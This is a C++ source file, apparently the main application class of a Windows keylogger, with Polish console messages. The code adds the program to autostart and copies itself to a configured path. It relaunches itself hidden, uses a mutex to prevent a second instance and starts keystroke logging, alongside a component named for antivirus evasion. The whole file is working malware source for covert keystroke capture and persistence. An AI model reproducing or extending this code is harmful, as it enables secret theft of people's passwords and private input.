#include "application.h"

Application::Application(string fileName)
{
    this->config = new Config();
    this->keylogger = new Keylogger();
    this->time = new TimeLog();
    this->log = new Log();
    this->antyAV = new AntyAv();
    this->keyloggerFileName = fileName;
    this->autorun = new Autorun(this->getKeyloggerFileName());
    this->newWinApix = new newWinApi();
}

void Application::start()
{
    if (this->isMultiRun())
    {
        exit(EXIT_SUCCESS);
    }
    else
    {
        this->autorun->addAutostart();
        cout << "Dodano autostart" << endl;
        cout << this->autorun->isCopyFile();
        cout << "Przekopiowano" << endl;
        if (this->keyloggerFileName != this->config->GetRegFilePath())
        {
            this->newWinApix->UruchomPlik() (this->StringToLPCTSTR(this->config->GetRegFilePath()), SW_HIDE);
            exit(EXIT_SUCCESS);
        }\
        this->running();
    }
}

void Application::stop()
{
    exit(EXIT_SUCCESS);
}

void Application::running()
{
    cout << "Włączono keyloggera" << endl;
    this->keylogger->startLogging();
    while (true)
    {

    }
}

bool Application::isMultiRun()
{
    CreateMutex(NULL, TRUE, this->StringToLPCTSTR(this->config->GetMutexRunKey()));
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        return true;
    }
    else
    {
        return false;
    }
}

LPCTSTR Application::StringToLPCTSTR(string str)
{
    LPTSTR lptstrConvertTmp = new TCHAR[str.size() + 1];
    strcpy(lptstrConvertTmp, str.c_str());
    return lptstrConvertTmp;
}

string Application::getKeyloggerFileName()
{
    return this->keyloggerFileName;
}
